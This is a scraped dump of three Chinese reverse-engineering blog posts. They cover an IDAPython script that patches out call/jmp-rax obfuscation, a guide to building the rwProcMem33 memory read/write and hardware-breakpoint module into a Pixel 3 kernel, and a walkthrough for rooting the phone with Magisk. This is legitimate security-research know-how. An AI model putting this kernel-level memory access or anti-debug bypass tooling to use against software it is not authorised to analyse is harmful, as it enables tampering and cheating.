text 段的起始地址text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x41143D,0x41145F# 测试 call rax#start, end = 0x411489,0x411498# 测试 jmp rax case1# start, end = 0x411568, 0x411575 # 测试 jmp rax case2#start, end = 0x410EC0,0x412670# 去除 check 函数的混淆#start, end = 0x410EC0,0x412670# 在 check 中测试 jmp rax case2current_addr = startcall_table = 0x67F1A0 # call rax 跳转表地址'''这是一个call rax基本块 需要去除mov rax, [rax+14E8h];call raxmov rax, [rax+14E8h]movzx edi, byte ptr [rbp+var_50+6]mov edx, offset dword_674040mov esi, 1lea rcx, [rbp+var_120]mov r8d, 2AE8944Ahcall rax处理后应为如下形式movzx edi, byte ptr [rbp+var_50+6]mov edx, offset dword_674040mov esi, 1lea rcx, [rbp+var_120]mov r8d, 2AE8944Ahcall sub_xxxxxx'''while current_addr &lt;= end: #print(hex(current_addr)) # 处理 call rax 结构 if idc.print_insn_mnem(current_addr) == \"call\" and idc.print_operand(current_addr, 0) == \"rax\": # print(\"call rax\") call_rax_addr = current_addr mov_rax_xxxh_addr = -1 call_func_addr = -1 # 获取需要跳转的地址 temp_addr = call_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"mov\" and idc.print_operand(temp_addr, 0) == \"rax\" and \"rax\" in idc.print_operand( temp_addr, 1): mov_rax_xxxh_addr = temp_addr # 获取 [rax+14E8h] 中的 14E8 十六进制字符串 tmp_call_table_offset_re_result = re.findall(r'\\[\\w+\\+([\\da-fA-F]+)', idc.print_operand(temp_addr, 1)) if tmp_call_table_offset_re_result: tmp = tmp_call_table_offset_re_result[0] #print(tmp) if len(tmp)%2==1: if tmp.startswith('0'): tmp = tmp[1::] else: tmp = '0'+tmp call_table_offset = binascii.a2b_hex(tmp) else: break call_table_offset = int.from_bytes(call_table_offset, 'big') call_func_addr = ida_bytes.get_dword(call_table + call_table_offset) break temp_addr = idc.prev_head(temp_addr) count = count+1 # print(hex(call_func_addr)) if call_rax_addr == -1 or mov_rax_xxxh_addr == -1 or call_func_addr == -1: current_addr = idc.next_head(current_addr) continue # 准备 patch movRAX_callRAX_patch = b'' # print(hex(idc.next_head(mov_rax_xxxh_addr)),hex(call_rax_addr)) ea = idc.next_head(mov_rax_xxxh_addr) while ea &lt; call_rax_addr: size = idc.next_head(ea) - ea #print(ida_bytes.get_bytes(ea, size)) movRAX_callRAX_patch += ida_bytes.get_bytes(ea, size) ea = idc.next_head(ea) # 计算跳转到的地址 if call_func_addr != -1: ks = Ks(KS_ARCH_X86, KS_MODE_64) code = f\"call &#123;call_func_addr&#125;\" patch_call_rax_byte, count = ks.asm(code, addr=(mov_rax_xxxh_addr + len(movRAX_callRAX_patch))) #print(call_func_addr, code, patch_call_rax_byte) else: continue movRAX_callRAX_patch += bytes(patch_call_rax_byte) # print(movRAX_callRAX_patch) ida_bytes.patch_bytes(mov_rax_xxxh_addr, b'\\x90' * (idc.next_head(call_rax_addr) - mov_rax_xxxh_addr)) ida_bytes.patch_bytes(mov_rax_xxxh_addr, movRAX_callRAX_patch) print(f\"fix call rax at &#123;hex(call_rax_addr)&#125;\") # 处理 jmp rax 结构 ''' 考虑两种情况 此时需要先获取rcx 一: mov rax, cs:qword_67CA28 mov ecx, 0ADAE163Ch add rax, rcx jmp rax 二: mov rax, cs:qword_67CA30 add rax, 5C65CCC7h jmp rax ''' if idc.print_insn_mnem(current_addr) == \"jmp\" and idc.print_operand(current_addr, 0) == \"rax\": # print(\"jmp rax\") mov_rax_qword_xxx_addr = -1 mov_reg_xxx_addr = -1 add_rax_xxx_addr = -1 jmp_rax_addr = current_addr add_num1 = -1 add_num2 = -1 # 获取加上的第一个数 temp_addr = jmp_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"mov\" and idc.print_operand(temp_addr, 0) == \"rax\": mov_rax_qword_xxx_addr = temp_addr tmp = re.findall(r'cs:qword_([0-9A-Fa-f]+)', idc.print_operand(temp_addr, 1)) if tmp: add_num1_addr = tmp[0] add_num1_addr = int.from_bytes(binascii.a2b_hex(add_num1_addr), 'big') add_num1 = ida_bytes.get_qword(add_num1_addr) else: break #print(add_num1_addr) break temp_addr = idc.prev_head(temp_addr) count = count+1 # 获取加上的第二个数 temp_addr = jmp_rax_addr count = 1 while temp_addr >= start and count&lt;30: if idc.print_insn_mnem(temp_addr) == \"add\" and idc.print_operand(temp_addr, 0) == \"rax\": add_rax_xxx_addr = temp_addr # 如果直接加上一个数 if not idc.print_operand(temp_addr, 1).endswith('x'): add_num2 = idc.print_operand(temp_addr, 1) # 如果这个数是通过寄存器例如 ecx 赋值的 else: tmp_add_num2_reg = idc.print_operand(temp_addr, 1) temp_addr_2 = temp_addr count2 = 1 while temp_addr_2 >= start and count2&lt;30: # print(idc.print_insn_mnem(temp_addr),idc.print_operand(temp_addr, 0)[1::],tmp_add_num2_reg[1::]) if idc.print_insn_mnem(temp_addr_2) == \"mov\" and idc.print_operand(temp_addr_2, 0)[ 1::] == tmp_add_num2_reg[1::]: add_num2 = idc.print_operand(temp_addr_2, 1) mov_reg_xxx_addr = temp_addr_2 break temp_addr_2 = idc.prev_head(temp_addr_2) count2=count2+1 try: add_num2 = add_num2.strip('h') if len(add_num2) % 2 == 1: if add_num2.startswith('0'): add_num2 = add_num2[1::] else: add_num2 = '0' + add_num2 add_num2 = int.from_bytes(binascii.a2b_hex(add_num2), 'big') #print(add_num2) except: break break temp_addr = idc.prev_head(temp_addr) count = count+1 if add_num1 == -1 or add_num2 == -1 or mov_rax_qword_xxx_addr == -1 or add_rax_xxx_addr == -1 or jmp_rax_addr == -1: #print(add_num1,add_num2,mov_rax_qword_xxx_addr,add_rax_xxx_addr,jmp_rax_addr) current_addr = idc.next_head(current_addr) continue # 准备 patch movRAX_jmpRAX_patch = b'' #print(hex(idc.next_head(mov_rax_xxxh_addr)), hex(call_rax_addr)) should_pass_addr = [mov_rax_qword_xxx_addr, mov_reg_xxx_addr, add_rax_xxx_addr, jmp_rax_addr] ea = mov_rax_qword_xxx_addr while ea &lt; jmp_rax_addr: if ea not in should_pass_addr: size = idc.next_head(ea) - ea # print(ida_bytes.get_bytes(ea, size)) movRAX_jmpRAX_patch += ida_bytes.get_bytes(ea, size) ea = idc.next_head(ea) # 计算跳转到的地址 #print(hex(add_num1), add_num2) jmp_addr = (add_num1 + add_num2) &amp; 0xffffffff ks = Ks(KS_ARCH_X86, KS_MODE_64) code = f\"jmp &#123;jmp_addr&#125;\" patch_call_rax_byte, count = ks.asm(code, addr=(mov_rax_qword_xxx_addr + len(movRAX_jmpRAX_patch))) # print(call_func_addr, code, patch_call_rax_byte) movRAX_jmpRAX_patch += bytes(patch_call_rax_byte) # print(movRAX_callRAX_patch) ida_bytes.patch_bytes(mov_rax_qword_xxx_addr, b'\\x90' * (idc.next_head(jmp_rax_addr) - mov_rax_qword_xxx_addr)) ida_bytes.patch_bytes(mov_rax_qword_xxx_addr, movRAX_jmpRAX_patch) print(f\"fix jmp rax at &#123;hex(jmp_rax_addr)&#125;\") current_addr = idc.next_head(current_addr)#patch_nop(0x410FB3,0x41142C) # 参考资料 ida python 使用 idapython 笔记学习 在 PyCharm 中写 IDAPython 脚本","categories":[],"tags":[{"name":"idapython","slug":"idapython","permalink":"https://oacia.dev/tags/idapython/"}]},{"title":"将rwProcMem33编译进安卓内核","slug":"rwProcMem33-usage","date":"2023-08-10T13:41:17.000Z","updated":"2025-04-08T18:55:11.741Z","comments":true,"path":"rwProcMem33-usage/","link":"","permalink":"https://oacia.dev/rwProcMem33-usage/","excerpt":"","text":"为了做出腾讯游戏安全竞赛初赛的这道安卓题，开始学习 rwProcMem33 的使用来打硬件断点了 在 juice4fun 师傅做腾讯游戏安全竞赛初赛的安卓题的 writeup 时，使用了 rwProcMem33 来对安卓手机打下硬件断点分析反调试，我也对在安卓手机中打硬件断点的工具很感兴趣，所以就学习一下编译和使用的方法啦 要想使用 rwProcMem33, 编译环境 (即 AOSP 安卓内核源码环境) 的搭建过程是必不可少的，因为最终内核模块是运行在安卓手机的 linux 内核中，而非虚拟机的 linux 内核中，所以内核源码是有必要下载的 所以这篇文章不仅是硬件断点工具的编译和使用笔记，也是安卓内核的编译笔记，用来记录我在编译内核的过程中遇到的困难，以及如何克服的 为了更快的下载速度，可以选择配置代理，也可以手动切换下载源，只要不出现网络问题导致下载失败就行 docker 的使用完全是因为我的虚拟机 shell 环境崩溃，从而导致无法编译，如果对自己虚拟机的 shell 环境足够自信，不使用 docker 也是可以的 # 编译环境搭建 # 虚拟机配置 我使用的虚拟机为 Ubuntu22.04 , 虚拟机的参考配置如下 # 为虚拟机配置代理 # 查看虚拟机代理地址 打开 clash for windows , 并打开 Allow LAN 的开关，随后点击 network interfaces 请注意我的虚拟机使用的网络连接方式为 NAT 模式，所以需要关注 VMnet8 的地址，所以对于该虚拟机，代理地址为 192.168.27.1 , 端口就是 clash 中 Port 选项所显示的端口 # 启用虚拟机代理 依次点击如下选项进入代理配置 输入代理地址保存即可 # 配置 docker ubuntu 镜像 本人因为不小心运行了一个命令 source _setup_env.sh , 导致虚拟机的 shell 环境整个崩掉了， build.sh 也屡屡运行失败，看了眼 _setup_env.sh 我真是只能苦涩的笑… 所以不得不用 docker 了，不过用下来发现竟然意外的好用 # 安装 docker sudo apt install docker.io# docker pull 代理配置 sudo mkdir -p /etc/systemd/system/docker.service.dsudo gedit /etc/systemd/system/docker.service.d/proxy.conf输入以下代理服务器内容 [Service]Environment=\"HTTP_PROXY=http://192.168.27.1:7890/\"Environment=\"HTTPS_PROXY=http://192.168.27.1:7890/\"Environment=\"NO_PROXY=localhost,127.0.0.1\"# 刷新配置并重启 docker 服务 sudo systemctl daemon-reloadsudo systemctl restart docker# docker 镜像代理配置 sudo mkdir -p ~/.docker/sudo gedit ~/.docker/config.json输入以下内容 &#123; \"proxies\": &#123; \"default\": &#123; \"httpProxy\": \"http://192.168.27.1:7890/\", \"httpsProxy\": \"http://192.168.27.1:7890/\", \"noProxy\": \"localhost,127.0.0.1\" &#125; &#125;&#125;# 下载 Ubuntu 镜像 docker pull ubuntu# 运行 Ubuntu 镜像 docker run -it --net host --name Akernel ubuntu /bin/bash# 安装 sudo,vim apt-get updateapt-get install vimapt-get install sudo# 修改 apt-get 的软件源为阿里源 sudo cp /etc/apt/sources.list /etc/apt/sources.list_backupsudo vim /etc/apt/sources.list替换为如下内容 deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse# deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse随后将 apt-get 更新至最新版本 sudo apt-get updatesudo apt-get upgradesudo apt-get install build-essential# 安装必要的库 sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libssl-dev bc kmod cpio git curl# 为 git 配置基本信息 git config --global user.email \"xxx@gmail.com\"git config --global user.name \"xxx\"git config --global http.proxy 192.168.27.1:7890# 安装 repo mkdir ~/bincurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repochmod a+x ~/bin/repo# 修改 repo 的下载源为清华源，并添加 repo 至全局变量 # 打开全局变量配置文件 sudo vim ~/.bashrc# 添加全局变量 在末尾添加这三行并保存 # repoexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/'export PATH=\"~/bin:$PATH\"# 使配置文件生效 source ~/.bashrc# 安装 python 如果使用 python --version 有打印 python 版本的话，那么这一步就不需要了，如果 docker 中没有安装 python , 在 docker 内使用如下命令安装 sudo apt-get install software-properties-commonadd-apt-repository ppa:deadsnakes/ppasudo apt install python3.9sudo ln -s /usr/bin/python3 /usr/bin/python# 修改交换区大小 为了防止编译源码的过程中由于交换区不足而失败，所以我们需要去修改虚拟机的交换区的大小 # 如果提示 No such file or directory，那就直接进行下面设置交换区的操作sudo swapoff /swapfilesudo rm /swapfile# 设置了 32g 交换区，防止编译失败，执行下列命令需要花费一段时间，如果执行命令后没有输出，请耐心等待命令执行完毕sudo dd if=/dev/zero of=/swapfile bs=1GB count=32sudo chmod 600 /swapfilesudo mkswap -f /swapfilesudo swapon /swapfile# 下载内核源码 # 查看内核版本号 这里我的 pixel3 的内核版本为 Linux version 4.9.270-g862f51bac900-ab7613625 adb shell cat /proc/versionLinux version 4.9.270-g862f51bac900-ab7613625 (android-build@abfarm-east4-101) (Android (7284624, based on r416183b) clang version 12.0.5 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee)) #0 SMP PREEMPT Thu Aug 5 07:04:42 UTC 2021# 查看内核源码分支 进入 building-kernels 中查看自己的源码分支，如图我的手机型号为 pixel3 , 并且内核版本为 4.9, 于是就知道内核源码的代号是 android-msm-crosshatch-4.9 之后进入安卓内核源码列表中，搜索内核源码代号 android-msm-crosshatch-4.9 我的手机是安卓 12, 所以我下载的内核版本为 android-msm-crosshatch-4.9-android12 这里的 qpr1 和 qpr2 , 我们先看一下 QPR 的定义，简单来说就是 QPR 后面跟的数字越高，内核版本就越新 QPR, of course, is short for the Quarterly Platform Release, which Google first introduced with Android 12. These are not full system updates, but they bring a few select changes to the Pixels and other great high-end phones that opt to receive them. 注意一点就是例如你想要下载 android-msm-crosshatch-4.9-android10, 请先进入你想要下载的 AOSP 的地址，看看仓库中的 default.xml 文件，重点关注 &lt;project path=&quot;build&quot; name=&quot;kernel/build&quot; , 如果 revision 的值为 main , 请千万不要下载，否则你就会发现下载下来之后根本无法 build!!, 这是由于 build 仓库和内核源码仓库不同步导致的 当然你也可以选择进入 kernel/build 中找到适合你的 build file , 不过我还是建议能一键编译就一键编译，比如我下载的 android-msm-crosshatch-4.9-android12 , build 和 kernel source code 就是同步的 (惨痛的教训，头铁想要用安卓 9 的内核源码编译，结果根本无法 build… 最后还是妥协把手机刷成安卓 12 了) # 下载内核源码 mkdir android-kernel &amp;&amp; cd android-kernelrepo init -u https://android.googlesource.com/kernel/manifest -b android-msm-crosshatch-4.9-android12repo sync -j4# 切换 git 分支 我的手机的 Linux 内核版本为 Linux version 4.9.270-g862f51bac900-ab7613625 , g 后面跟的是 git 分支，所以切换的分支为 862f51bac900 cd private/msm-googlegit checkout 862f51bac900# 编译内核源码 # 解包 boot.img 首先下载 android-image-kitchen 然后将 boot.img 放在工具的根目录下，这里的 boot.img 就是网上下载的刷机包解压之后其中的 boot.img 然后运行 unpackimg.bat , 运行之后的窗口请不要关闭，因为输出中有需要后续使用到的参数，当然也可以将输出的内容复制下来到 txt 中 Android Image Kitchen - UnpackImg Scriptby osm0sis @ xda-developersSupplied image: boot.imgRemoving old work folders and files . . .Setting up work folders . . .Image type: AOSPSignature with \"AVBv2\" type detected.Splitting image to \"split_img/\" . . .ANDROID! magic found at: 0BOARD_KERNEL_CMDLINE console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=userBOARD_KERNEL_BASE 0x00000000BOARD_NAMEBOARD_PAGE_SIZE 4096BOARD_HASH_TYPE sha1BOARD_KERNEL_OFFSET 0x00008000BOARD_RAMDISK_OFFSET 0x01000000BOARD_SECOND_OFFSET 0x00000000BOARD_TAGS_OFFSET 0x00000100BOARD_OS_VERSION 12.0.0BOARD_OS_PATCH_LEVEL 2021-10BOARD_HEADER_VERSION 2BOARD_HEADER_SIZE 1660BOARD_DTB_SIZE 863100BOARD_DTB_OFFSET 0x01f00000Unpacking ramdisk to \"ramdisk/\" . . .Compression used: gzip56773 blocksDone!请按任意键继续. . .当 unpackimg.bat 运行完毕后，我们进入 split_img/ , 然后解压其中的 boot.img-ramdisk.cpio.gz , 并将解压后的 boot.img-ramdisk.cpio 文件复制到内核源码根目录中 root@oacia-virtual-machine:/home/oacia/Desktop/# docker cp boot.img-ramdisk.cpio Akernel:/android-kernel/# 下载 mkbootimg.py 我们还需要下载 mkbootimg.py, 并将其复制到放到内核源码根目录 docker cp mkbootimg.py Akernel:/android-kernel/# 修改 build.sh 在内核源码根目录，进入 build/build.sh , 找到下方代码的位置 echo \"========================================================\"echo \" Files copied to $&#123;DIST_DIR&#125;\"并在这两行代码之前加上下列命令 if [ -f \"$&#123;VENDOR_RAMDISK_BINARY&#125;\" ]; thencp $&#123;VENDOR_RAMDISK_BINARY&#125; $&#123;DIST_DIR&#125;fi # 下载 rwProcMem33 下载地址 https://github.com/abcz316/rwProcMem33然后将解压后的文件夹复制到 docker 中内核源码目录下的 private/msm-google/drivers/ 中 docker cp rwProcMem33 Akernel:/android-kernel/private/msm-google/drivers/# 修改 rwProcMem33 # ver_control.h 将 MY_LINUX_VERSION_CODE 切换到对应的安卓内核版本，我们在下载内核源码阶段已经通过 cat /proc/version 知道了内核的版本号为 Linux version 4.9.270-g862f51bac900-ab7613625 , 所以在 private/msm-google/drivers/rwProcMem33/ver_control.h 和 private/msm-google/drivers/rwProcMem33/hwBreakpointProcModule/hwBreakpointProc/ver_control.h 中我们也将内核切换到对应的 4.9 版本，选择 MY_LINUX_VERSION_CODE 的原则选这里出现的版本号中越接近自己手机内核版本的版本号 在 Linux 4.11 前，Linux 内核把页表分为 4 级 页全局目录 (Page Global Directory，PGD) 页上层目录 (Page Upper Directory，PUD) 页中间目录 (Page Middle Directory，PMD) 直接页表 (Page Table，PT) 所以对于 Linux version 4.11 以下的内核版本，并不支持五级页表，选择 启用读取pagemap文件来计算物理内存的地址 ，同时注释掉 启用页表计算物理内存的地址 如图所示 Linux version 4.11 版本把页表扩展到五级，在页全局目录和页上层目录之间增加了页四级目录 (Page 4th Directory，P4D) 所以对于 Linux version 4.11 及以上的内核版本，选择 启用页表计算物理内存的地址 ，同时注释掉 启用读取pagemap文件来计算物理内存的地址 如图所示 # linux_kernel_api 文件夹 在 rwProcMem33/linux_kernel_api 文件夹中新建一个头文件 linux_kernel_api.h 并写入如下内容 #ifndef LINUX_KERNEL_API_H_#define LINUX_KERNEL_API_H_#include \"../ver_control.h\"#if MY_LINUX_VERSION_CODE &lt; KERNEL_VERSION(5,8,0)long probe_kernel_read(void* dst, const void* src, size_t size);MY_STATIC long x_probe_kernel_read(void* bounce, const char* ptr, size_t sz) &#123; return probe_kernel_read(bounce, ptr, sz);&#125;#endif#if MY_LINUX_VERSION_CODE >= KERNEL_VERSION(5,8,0)long copy_from_kernel_nofault(void* dst, const void* src, size_t size);MY_STATIC long x_probe_kernel_read(void* bounce, const char* ptr, size_t sz) &#123; return copy_from_kernel_nofault(bounce, ptr, sz);&#125;#endif#endif /* LINUX_KERNEL_API_H_ */# api_proxy.h 为了包含 linux_kernel_api.h 头文件，我们在 api_proxy.h 的前几行中加入 #include &quot;linux_kernel_api/linux_kernel_api.h&quot; 如图 # 修改 drivers 的 Makefile 在 private/msm-google/drivers/Makefile 的开头加入下列命令 obj-y += rwProcMem33/hwBreakpointProcModule/hwBreakpointProc/obj-y += rwProcMem33/# 修改 msm-google 的 Makefile 在编译 rwProcMem33 内核模块时，由于内核编译时会将警告视为错误导致编译内核停止，所以我们要修改 Makefile 来忽视 warning 在 private/msm-google/Makefile 找到如下位置，在 -Wno-format-security 后加上一个 -w 参数 # 开始编译 在安卓内核源码的根目录打开终端使用如下命令开始编译 命令的参数为使用 android-image-kitchen 解包 boot.img 之后，控制台所打印的参数 请务必替换为相对应的参数！！！ 参数对应关系为 android-image-kitchen 解包参数名称 值 编译命令参数名称 BOARD_KERNEL_CMDLINE console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=user KERNEL_CMDLINE BOARD_KERNEL_BASE 0x00000000 BASE_ADDRESS BOARD_PAGE_SIZE 4096 PAGE_SIZE BOARD_HEADER_VERSION 2 BOOT_IMAGE_HEADER_VERSION 编译命令中的 BUILD_CONFIG 为 AOSP 源码根目录的 build.config 的软连接所指向的配置文件 所以最终的编译命令为 BUILD_CONFIG=private/msm-google/build.config.bluecross BUILD_BOOT_IMG=1 MKBOOTIMG_PATH=mkbootimg.py VENDOR_RAMDISK_BINARY=boot.img-ramdisk.cpio KERNEL_BINARY=Image.lz4 BOOT_IMAGE_HEADER_VERSION=2 KERNEL_CMDLINE=\"console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=user\" BASE_ADDRESS=0x00000000 PAGE_SIZE=4096 build/build.sh经过一段时间的等待，编译成功！ 生成的 boot.img 的路径为 /android-kernel/out/android-msm-pixel-4.9/dist/boot.img # 使用 Magisk 修补 boot.img 实现 root 安装 Magisk 下载地址 adb install \"D:\\TOOLS\\pixel3\\Magisk-v26.1.apk\"将由内核源码编译出来的 boot.img 上传到手机上 adb push boot.img /sdcard/然后在手机上打开 Magisk , 依次点击 安装-&gt;选择并修补一个文件-&gt;/sdcard/boot.img-&gt;开始 待修补完成后，将修补后的 boot.img 传到电脑上 adb pull /storage/emulated/0/Download/magisk_patched-xxxxx_xxxxx.img# 刷入内核 adb reboot bootloaderfastboot flash boot magisk_patched-xxxxx_xxxxx.imgfastboot reboot# 编译 HwBpClient 客户端 进入 rwProcMem33\\hwBreakpointProcModule\\testHwBpClient 文件夹，双击 testHwBpClient.vcxproj 在 visual studio 中打开 编译的程序位数应为 64 位 对于 Windows 平台编译的 HwBpClient , 并且需要在 testHwBpClientDlg.cpp 的这个位置进行修改，将这个位置的 llX 改为 I64X , %zu 改成 I64d , 否则将无法正确输入内容 原因在于 C/C++ 输出 64 位数在 window 下和 linux 下是不一样的 linux printf(\"%lld/n\",a);printf(\"%llu/n\",a);printf(\"%llx/n\",a);windows printf(\"%I64d/n\",a);printf(\"%I64u/n\",a);printf(\"%I64x/n\",a);修改完成后如图所示 接下来按下 ctrl+B 生成即可 # 编译 HwBpServer 服务端 编译 HwBpServer 服务端需要 NDK, 并将 NDK 引入环境变量中 NDK 可以在 android studio 中进行安装，依次点击 File-&gt;Project Structure-&gt;SDK Location , 找到 Android NDK location , 点击 Download 即可开始安装，我这里使用的 ndk 的版本为 ndk25.2.9519653 如果没有安装 Android studio ,NDK 的安装方法可以在谷歌上找到 NDK 安装完成后，进入到 rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\jni , 打开 cmd 运行命令 ndk-build即可完成编译，编译后的文件在 rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\libs 中，选择对应手机架构的 ELF, push 到手机中运行即可 # 获取手机的 IPv4 地址 将电脑和我们的测试手机连接同一个手机热点，然后在测试手机中打开 设置-&gt;WLAN 点击我们连接的热点的高级选项，来查看手机的 IP 地址 # 运行 HwBpServer 服务端 将编译出来的程序复制到手机中并运行 adb push rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\libs\\arm64-v8a\\testHwBpServer.out /data/local/tmpadb shellsucd /data/local/tmpchmod 777 testHwBpServer.out./testHwBpServer.out查看打印出来的端口号 3170 # 运行 HwBpClient 客户端 在电脑中运行编译完成的 HwBpClient 客户端，填入手机的 IP 地址以及由 testHwBpServer.out 打印出来的端口号 点击连接即可开始打硬件断点 # 查询进程 PID ps -A# 查询目标 so 的基址 可以使用命令来查询 cat /proc/[app的PID]/maps也可以使用下面的 frida 脚本查询 so 的基址 function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;接下来就可以愉快的打硬件断点啦～ # 参考资料 [原创] 开源一个 Linux 内核里进程内存管理模块源码 万字长文教你使用安卓内核驱动进行内存读写 安卓内核驱动编译 AOSP Android 10 内核编译刷入 Pixel3 kernel 编译的哪些坑 eBPF on Android 之打补丁和编译内核修正版 Android10 内核编译笔记","categories":[],"tags":[{"name":"rwProcMem33","slug":"rwProcMem33","permalink":"https://oacia.dev/tags/rwProcMem33/"},{"name":"android kernel","slug":"android-kernel","permalink":"https://oacia.dev/tags/android-kernel/"}]},{"title":"Pixel3 刷机与root记录","slug":"Pixel3-root","date":"2023-08-08T06:34:45.000Z","updated":"2025-04-08T18:55:11.429Z","comments":true,"path":"Pixel3-root/","link":"","permalink":"https://oacia.dev/Pixel3-root/","excerpt":"","text":"今年上半年把我的老平板 SM-P200 root 了，不过用着用着就发现这平板的 USB 竟然接触不良！每过一段时间 usb 就会断开连接… az, 这对于我来说问题可是致命的，谁能忍受研究的好好的突然手机就失联了嘞 于是我在咸鱼淘了一台二手 pixel3, 至于为什么是 pixel3, 问就是谷歌亲儿子～ 看了眼手机已经刷成安卓 10 了，卖家也说解了 BL 锁，不过唯一美中不足的就是安卓 10 没 root, 那就只能亲自 root 咯～ 想了想安卓 10 安证书有点麻烦，索性就刷成安卓 9 好了哈哈 # 准备工作 在进行刷机前，请确保已经提前准备以下内容 (对于玩安卓的应该都挺简单的吧～) 安装 ADB 环境，如没有 ADB 环境请参考这篇文章 手机点击 设置-&gt;关于手机-&gt;版本号 ，连按 7 次进入开发者模式，点击 设置-&gt;系统-&gt;开发者选项 可以进入开发者选项 # 解锁 Bootloader ⚠️ 注意：解锁会抹除所有数据，请一定确认备份好重要数据后再解锁 手机： 开发者选项-&gt;OEM 解锁 - 打开 手机：进入 fastboot 模式，有以下两种方式 重启并长按（ 电源键 + 音量减 ） 输入 adb reboot bootloader 命令 电脑：USB 连接手机 - 执行 fastboot flashing unlock 我在 pixel6 解锁 BL 的过程中，执行 fastboot flashing unlock 命令一直卡在 &lt; waiting for any device &gt; , 所以这里记录一下我的解决方法 原因一 https://www.youtube.com/watch?v=ajdcWIY-5yo 这可能是由于未安装 Google USB Driver 导致的，前往官网下载安装包 官网也有写好的安装教程了 我的电脑右键-&gt;管理 进入设备管理器 随后 右键其他设备,选择手机的设备-&gt;更新驱动-&gt;浏览我的电脑以查找驱动程序 ，选择 usb_driver_r13-windows.zip 解压之后的文件夹路径 不过这个方法对我无效 原因二 试了半天，发现是 USB 数据线的问题，我在解锁 pixel6 的 BL 时发现 fastboot 似乎不识别 type-c, 需要让手机用 USB 连接电脑时，手机处于充电的状态才证明这根线是可用的 https://www.reddit.com/r/GooglePixel/comments/rc2lm7/pixel_6_not_detected_by_pc/ 换一根线就好了 (幸好线多～) 手机：按音量键直到看见 Unlock the bootloader - 按电源键确认 # 下载手机镜像 pixel 系列最好的一点就是镜像不用花钱买直接官网就能下载了～下载地址 下载完成后检查一波 sha256, 和下过来的对的上就没问题了 PS D:\\TOOLS\\pixel3> certutil -hashfile .\\blueline-pq2a.190405.003-factory-c12f40f0.zip sha256SHA256 的 .\\blueline-pq2a.190405.003-factory-c12f40f0.zip 哈希:c12f40f0b189eb2daa80d029917bc9a8841da89cfcafa21b8f61b0d9f90826e7CertUtil: -hashfile 命令成功完成。# 刷入 google 官方镜像 ⚠️ 如果要刷入的镜像版本号与原手机的版本号不一致，请进行该步操作，否则请忽略这一步！！ adb reboot bootloader # 先进入 bootloader 模式.\\flash-all.bat #Windows 用户请使用该命令进行刷入，Mac 用户请使用./flash-all.sh 进行刷入随后静静等待镜像刷入完成即可～ # 使用 Magisk 修补 boot.img 实现 root 安装 Magisk 下载地址 adb install \"D:\\TOOLS\\pixel3\\Magisk-v26.1.apk\"将镜像解压后，把 boot.img 传到手机上 adb push boot.img /sdcard/然后再手机上打开 Magisk , 依次点击 安装-&gt;选择并修补一个文件-&gt;/sdcard/boot.img-&gt;开始 待修补完成后，将修补后的 boot.img 传到电脑上 adb pull /storage/emulated/0/Download/magisk_patched-xxxxx_xxxxx.img然后刷入经过 Magisk 修补好的 boot.img adb reboot bootloader # 先进入 fastboot modefastboot flash boot magisk_patched-xxxxx_xxxxx.img测试一波，出现 # 就是 root 完成啦 PS D:\\TOOLS\\pixel3> adb shellblueline:/ $ sublueline:/ #Pixel3, 未来还请多多指教 (●’◡’●) # 参考资料 Pixel3 刷机 Android9 并 Root 玩机的必备操作 —— Pixel3 安装 